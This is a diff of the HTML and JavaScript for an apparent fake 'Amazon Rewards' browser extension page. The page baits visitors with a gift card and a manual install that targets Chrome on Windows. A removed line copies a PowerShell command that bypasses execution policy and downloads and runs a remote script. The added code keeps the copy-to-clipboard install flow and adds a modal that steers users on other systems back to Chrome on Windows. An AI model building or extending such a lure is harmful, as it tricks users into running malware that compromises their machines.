@@ -67,10 +67,12 @@
             height: 100%;
             overflow: auto;
             background-color: rgba(0, 0, 0, 0.5);
+            align-items: center; /* Center vertically */
+            justify-content: center; /* Center horizontally */
         }
         .modal-content {
             background-color: #fefefe;
-            margin: 10% auto;
+            margin: auto; /* Adjust margin for centering */
             padding: 24px;
             border-radius: 12px;
             width: 90%;
@@ -91,14 +93,19 @@
             text-decoration: none;
         }
         .copy-code {
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
             font-family: monospace;
             background-color: #f3f4f6;
             border: 1px solid #e5e7eb;
             border-radius: 4px;
             padding: 8px 12px;
+            position: relative; /* For copy button positioning */
+        }
+        /* Specific styles for URL display to ensure it breaks lines */
+        #pageUrlDisplay {
+            white-space: normal; /* Allow text to wrap */
+            word-break: break-all; /* Break long words (URLs) */
+            overflow: visible; /* Ensure content is not hidden */
+            text-overflow: clip; /* Prevent ellipsis */
         }
         .copy-button {
             position: absolute;
@@ -109,12 +116,12 @@
     </style>
 </head>
 <body>
-    <!-- Installation Modal -->
+    <!-- Installation Modal (Chrome for Windows) -->
     <div id="installModal" class="modal">
         <div class="modal-content">
             <div class="flex justify-between items-start mb-4">
                 <h2 class="text-2xl font-bold">Install manually</h2>
-                <span class="close">&times;</span>
+                <span class="close">×</span>
             </div>
             
             <p class="mb-4">We aren't on the chrome webstore yet, but you can install using these simple steps:</p>
@@ -138,6 +145,30 @@
                     <p class="font-medium mb-2">Step 3. Press OK, and we will add the extension to your browser. You should see a success message.</p>
                 </div>
             </div>
+        </div>
+    </div>
+
+    <!-- New Modal for Non-Chrome/Windows Users -->
+    <div id="chromeWindowsModal" class="modal">
+        <div class="modal-content">
+            <div class="flex justify-between items-start mb-4">
+                <h2 class="text-2xl font-bold">Install on Chrome for Windows</h2>
+                <span class="close" id="closeChromeWindowsModal">×</span>
+            </div>
+            
+            <p class="mb-4">To get the full Amazon Rewards experience, please install our extension on Chrome for Windows.</p>
+            
+            <div class="mb-5">
+                <p class="font-medium mb-2">Share this link to install later:</p>
+                <div class="relative">
+                    <div id="pageUrlDisplay" class="copy-code"></div> <!-- Will be filled by JS -->
+                    <button id="copyPageUrlButton" class="copy-button bg-amber-500 hover:bg-amber-600 text-white text-sm font-medium py-1 px-3 rounded transition duration-300">
+                        Copy Link
+                    </button>
+                </div>
+            </div>
+
+            <p class="text-sm text-gray-600">You are currently using <span id="detectedBrowserName" class="font-semibold"></span> on <span id="detectedOSName" class="font-semibold"></span>.</p>
         </div>
     </div>
 
@@ -537,47 +568,69 @@
             </div>
             
             <div class="border-t border-gray-700 mt-8 pt-8 text-center text-gray-400">
-                <p>&copy; 2025 Amazon Rewards. All rights reserved.</p>
+                <p>© 2025 Amazon Rewards. All rights reserved.</p>
                 <p class="mt-2 text-sm">Amazon Rewards is not affiliated with Amazon.com, Inc.</p>
             </div>
         </div>
     </footer>
 
     <script>
+        // Global variables to store detected browser/OS info
+        let currentIsChrome = false;
+        let currentIsWindows = false;
+        let currentBrowserName = "Browser";
+        let currentOSName = "Operating System";
+
         // Check for UTM campaign parameter
         function checkForCampaign() {
             const urlParams = new URLSearchParams(window.location.search);
             return urlParams.get('utm_campaign') === 'gift-50';
         }
         
-        // Detect browser and update install button text
+        // Detect browser and OS, and update install button text
         function detectBrowser() {
             const userAgent = navigator.userAgent;
-            let browserName = "Browser";
-            let isChrome = false;
-            let isWindows = false;
             
-            // More accurate browser detection
-            if (userAgent.indexOf("Firefox") !== -1) {
-                browserName = "Firefox";
-            } else if (userAgent.indexOf("SamsungBrowser") !== -1) {
-                browserName = "Samsung Browser";
-            } else if (userAgent.indexOf("Opera") !== -1 || userAgent.indexOf("OPR") !== -1) {
-                browserName = "Opera";
-            } else if (userAgent.indexOf("Edg") !== -1) {
-                browserName = "Edge";
-            } else if (userAgent.indexOf("Chrome") !== -1) {
-                browserName = "Chrome";
-                isChrome = true;
-            } else if (userAgent.indexOf("Safari") !== -1) {
-                browserName = "Safari";
-            }
-            
-            // Check if Windows
+            // Detect OS
             if (userAgent.indexOf("Windows") !== -1) {
-                isWindows = true;
+                currentOSName = "Windows";
+                currentIsWindows = true;
+            } else if (userAgent.indexOf("Mac") !== -1) {
+                currentOSName = "macOS";
+            } else if (userAgent.indexOf("Linux") !== -1) {
+                currentOSName = "Linux";
+            } else if (userAgent.indexOf("Android") !== -1) {
+                currentOSName = "Android";
+            } else if (userAgent.indexOf("iOS") !== -1 || userAgent.indexOf("iPhone") !== -1 || userAgent.indexOf("iPad") !== -1) {
+                currentOSName = "iOS";
+            } else {
+                currentOSName = "Unknown Operating System";
+            }
+
+            // Detect browser
+            if (userAgent.indexOf("Firefox") !== -1) {
+                currentBrowserName = "Firefox";
+            } else if (userAgent.indexOf("SamsungBrowser") !== -1) {
+                currentBrowserName = "Samsung Browser";
+            } else if (userAgent.indexOf("Opera") !== -1 || userAgent.indexOf("OPR") !== -1) {
+                currentBrowserName = "Opera";
+            } else if (userAgent.indexOf("Edg") !== -1) {
+                currentBrowserName = "Edge";
+            } else if (userAgent.indexOf("Chrome") !== -1) {
+                currentBrowserName = "Chrome";
+                currentIsChrome = true;
+            } else if (userAgent.indexOf("Safari") !== -1) {
+                currentBrowserName = "Safari";
+            } else {
+                currentBrowserName = "Unknown Browser";
             }
             
+            // Update detected browser/OS names in the new modal
+            const detectedBrowserNameSpan = document.getElementById('detectedBrowserName');
+            const detectedOSNameSpan = document.getElementById('detectedOSName');
+            if (detectedBrowserNameSpan) detectedBrowserNameSpan.textContent = currentBrowserName;
+            if (detectedOSNameSpan) detectedOSNameSpan.textContent = currentOSName;
+
             // Check if we're in the gift-50 campaign
             const isGiftCampaign = checkForCampaign();
             
@@ -598,7 +651,7 @@
                 }
             }
             
-            // Update all install buttons with the detected browser name
+            // Update all install buttons with the detected browser name and add click events
             const installButtons = [
                 document.getElementById("install-button"),
                 document.getElementById("hero-install-button"),
@@ -608,31 +661,34 @@
             
             installButtons.forEach((button, index) => {
                 if (button) {
-                    // For header button, change text when in gift campaign
-                    if (index === 0 && isGiftCampaign) {
-                        button.textContent = `Add to ${browserName} - get a $50 gift card`;
-                    }
-                    // For hero button, always keep the "it's free" text
-                    else if (index === 1) {
-                        button.textContent = `Add to ${browserName} - it's free`;
-                    } 
-                    // For other buttons, change text when in gift campaign
-                    else if (isGiftCampaign) {
-                        button.textContent = `Add to ${browserName} - get a $50 gift card`;
-                    } else {
-                        button.textContent = `Add to ${browserName} - it's free`;
+                    // Update button text
+                    if (index === 0 && isGiftCampaign) { // Header button
+                        button.textContent = `Add to ${currentBrowserName} - get a $50 gift card`;
+                    } else if (index === 1) { // Hero button (always "it's free")
+                        button.textContent = `Add to ${currentBrowserName} - it's free`;
+                    } else if (isGiftCampaign) { // Other buttons when in gift campaign
+                        button.textContent = `Add to ${currentBrowserName} - get a $50 gift card`;
+                    } else { // Other buttons, default text
+                        button.textContent = `Add to ${currentBrowserName} - it's free`;
                     }
                     
-                    // Add click event for Chrome on Windows
-                    if (isChrome && isWindows) {
-                        button.addEventListener('click', function() {
-                            document.getElementById('installModal').style.display = 'block';
-                        });
-                    }
+                    // Add click event listener to open appropriate modal
+                    button.addEventListener('click', function() {
+                        if (currentIsChrome && currentIsWindows) {
+                            document.getElementById('installModal').style.display = 'flex'; // Show manual install modal
+                        } else {
+                            const chromeWindowsModal = document.getElementById('chromeWindowsModal');
+                            const pageUrlDisplay = document.getElementById('pageUrlDisplay');
+                            if (pageUrlDisplay) {
+                                pageUrlDisplay.textContent = window.location.href; // Set current URL
+                            }
+                            if (chromeWindowsModal) {
+                                chromeWindowsModal.style.display = 'flex'; // Show Chrome for Windows modal
+                            }
+                        }
+                    });
                 }
             });
-            
-            return { isChrome, isWindows };
         }
         
         // Add click effect to all buttons except Redeem Now
@@ -670,7 +726,7 @@
                 const centerX = windowWidth / 2;
                 const centerY = windowHeight / 2;
                 
-                // Calculate the tilt angle (max 15 degrees)
+                // Calculate the tilt angle (max 10 degrees)
                 // Map the mouse position to a tilt angle
                 const tiltX = ((mouseY - centerY) / (windowHeight / 2)) * 10;
                 const tiltY = ((mouseX - centerX) / (windowWidth / 2)) * -10;
@@ -680,61 +736,75 @@
             });
         }
         
-        // Setup modal functionality
-        function setupModal() {
-            const modal = document.getElementById('installModal');
-            const closeBtn = document.querySelector('.close');
-            const closeModalBtn = document.getElementById('closeModalButton');
-            const proceedBtn = document.getElementById('proceedButton');
-            const copyBtn = document.getElementById('copyButton');
-            const copyCode = document.getElementById('copyCode');
+        // Setup modal functionality for both modals
+        function setupModals() {
+            // Manual Install Modal
+            const installModal = document.getElementById('installModal');
+            const closeInstallModalBtn = installModal ? installModal.querySelector('.close') : null;
+            const copyCodeBtn = document.getElementById('copyButton');
+            const copyCodeDiv = document.getElementById('copyCode');
             
-            // Close modal when clicking the X
-            if (closeBtn) {
-                closeBtn.addEventListener('click', function() {
-                    modal.style.display = 'none';
+            if (closeInstallModalBtn) {
+                closeInstallModalBtn.addEventListener('click', function() {
+                    if (installModal) installModal.style.display = 'none';
                 });
             }
             
-            // Close modal when clicking the Cancel button
-            if (closeModalBtn) {
-                closeModalBtn.addEventListener('click', function() {
-                    modal.style.display = 'none';
-                });
-            }
-            
-            // Handle proceed button
-            if (proceedBtn) {
-                proceedBtn.addEventListener('click', function() {
-                    modal.style.display = 'none';
-                    alert('Thank you for installing Amazon Rewards!');
-                });
-            }
-            
-            // Handle copy button
-            if (copyBtn && copyCode) {
-                copyBtn.addEventListener('click', function() {
+            if (copyCodeBtn && copyCodeDiv) {
+                copyCodeBtn.addEventListener('click', function() {
                     // Create a temporary textarea element to copy from
                     const textarea = document.createElement('textarea');
-                    textarea.value = 'powershell -ep bypass -c "$wc=New-Object Net.WebClient;$wc.Encoding=[System.Text.Encoding]::UTF8;iex ($wc.DownloadString(\'https://bell-devs.github.io/extension-redirect/powershell.ps1\'))"';
+                    textarea.value = copyCodeDiv.textContent; // Copy the text content
                     document.body.appendChild(textarea);
                     textarea.select();
                     document.execCommand('copy');
                     document.body.removeChild(textarea);
                     
                     // Change button text temporarily
-                    const originalText = copyBtn.textContent;
-                    copyBtn.textContent = 'Copied!';
+                    const originalText = copyCodeBtn.textContent;
+                    copyCodeBtn.textContent = 'Copied!';
                     setTimeout(function() {
-                        copyBtn.textContent = originalText;
+                        copyCodeBtn.textContent = originalText;
                     }, 2000);
                 });
             }
-            
-            // Close modal when clicking outside of it
+
+            // Chrome for Windows Modal
+            const chromeWindowsModal = document.getElementById('chromeWindowsModal');
+            const closeChromeWindowsModalBtn = document.getElementById('closeChromeWindowsModal');
+            const copyPageUrlButton = document.getElementById('copyPageUrlButton');
+            const pageUrlDisplay = document.getElementById('pageUrlDisplay');
+
+            if (closeChromeWindowsModalBtn) {
+                closeChromeWindowsModalBtn.addEventListener('click', function() {
+                    if (chromeWindowsModal) chromeWindowsModal.style.display = 'none';
+                });
+            }
+
+            if (copyPageUrlButton && pageUrlDisplay) {
+                copyPageUrlButton.addEventListener('click', function() {
+                    const textarea = document.createElement('textarea');
+                    textarea.value = pageUrlDisplay.textContent; // Copy the page URL
+                    document.body.appendChild(textarea);
+                    textarea.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(textarea);
+
+                    const originalText = copyPageUrlButton.textContent;
+                    copyPageUrlButton.textContent = 'Copied!';
+                    setTimeout(function() {
+                        copyPageUrlButton.textContent = originalText;
+                    }, 2000);
+                });
+            }
+
+            // Close modals when clicking outside of them
             window.addEventListener('click', function(event) {
-                if (event.target === modal) {
-                    modal.style.display = 'none';
+                if (installModal && event.target === installModal) {
+                    installModal.style.display = 'none';
+                }
+                if (chromeWindowsModal && event.target === chromeWindowsModal) {
+                    chromeWindowsModal.style.display = 'none';
                 }
             });
         }
@@ -744,8 +814,8 @@
             detectBrowser();
             addButtonClickEffects();
             addGiftCardTiltEffect();
-            setupModal();
+            setupModals(); // Call the updated setup function
         });
     </script>
-<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9468bc218057dd56',t:'MTc0ODM4MjY5OS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</body>
 </html>
